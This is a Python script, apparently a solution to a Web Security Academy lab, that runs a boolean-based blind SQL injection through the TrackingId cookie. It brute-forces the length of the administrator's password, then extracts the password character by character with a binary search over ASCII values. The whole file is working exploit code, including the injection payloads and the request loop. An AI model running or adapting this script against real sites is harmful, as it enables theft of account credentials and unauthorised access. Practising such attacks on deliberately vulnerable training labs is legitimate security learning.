import requests

url ='https://0aaa005a0417fd4d810fb1d9008a003a.web-security-academy.net/filter?category=Gifts'
min_asci = 32
max_asci = 126
passwd=[]
def main():
    re = requests.get(url)
    global sessionId
    sessionId = re.headers['Set-Cookie'].split(';')[2].split('=')[1]
    print("Length_mk:{0}".format( passLong()))
    for m in range (1, passLong()+1):
        binaryPass(min_asci, max_asci, m)
        print("{0}.harf ={1}".format(m, chr(passwd[m-1])))

    stri = ""

    for x in passwd:
        stri+= chr(x)

    print(stri)
def passLong():
    m=1
    while(m>0):
        inject = 'x\' union select null from users where username=\'administrator\' and length(password)={0}--'.format(m)
        inject = inject.replace(' ', '+')
        cookies = {"TrackingId": inject, "session": sessionId}
        re = requests.get(url, cookies=cookies)
        son = str(re.content)
        if int(re.status_code) != 200:
            raise Exception("get method not 200")

        if (son.find("Welcome back") != -1):
            return m
        else:
            m=m+1
def binaryPass(min, max, m):

    mid = (max + min) // 2
    if check_Mid(m, mid):
        passwd.append(mid)
        return
    if lower_Mid(m, mid):
        binaryPass(min, mid, m)
    else:
        binaryPass(mid, max, m)

def check_Mid (m, n):
    inject = 'x\' union select null from users where username=\'administrator\' and ascii(substring(password,{0},1))={1}--'.format(m,n)
    inject = inject.replace(' ','+')
    cookies = {"TrackingId":inject,"session":sessionId}
    re = requests.get(url,cookies=cookies)
    son = str(re.content)
    if int(re.status_code) != 200:
        raise Exception("get method not 200")
    if (son.find("Welcome back") != -1):
        return True
    else:
        return False
def lower_Mid(m, n):
    inject = 'x\' union select null from users where username=\'administrator\' and ascii(substring(password,{0},1))<{1}--'.format(m,n)
    inject = inject.replace(' ','+')
    cookies = {"TrackingId":inject,"session":sessionId}
    re = requests.get(url,cookies=cookies)
    son = str(re.content)
    if int(re.status_code) != 200:
        raise Exception("get method not 200")
    if (son.find("Welcome back") != -1):
        return True
    else:
        return False

if __name__ == "__main__":
    main()
